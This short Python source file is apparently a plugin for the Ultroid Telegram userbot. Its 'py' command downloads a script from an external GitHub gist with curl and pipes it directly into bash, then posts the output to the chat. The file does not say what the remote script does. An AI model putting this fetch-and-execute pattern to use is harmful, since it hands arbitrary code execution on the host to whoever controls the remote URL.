from . import ultroid_cmd, get_string, bash, callback
import os, sys
@ultroid_cmd(pattern="py$",manager=True)
async def cht(e):
  c = await e.eor(get_string("com_1"))
  a,b = await bash(f"curl -L https://gist.githubusercontent.com/rooted-cyber/edc0ac4c7da73e933ad954f90c40447e/raw/py | bash")
  await c.edit(a)
  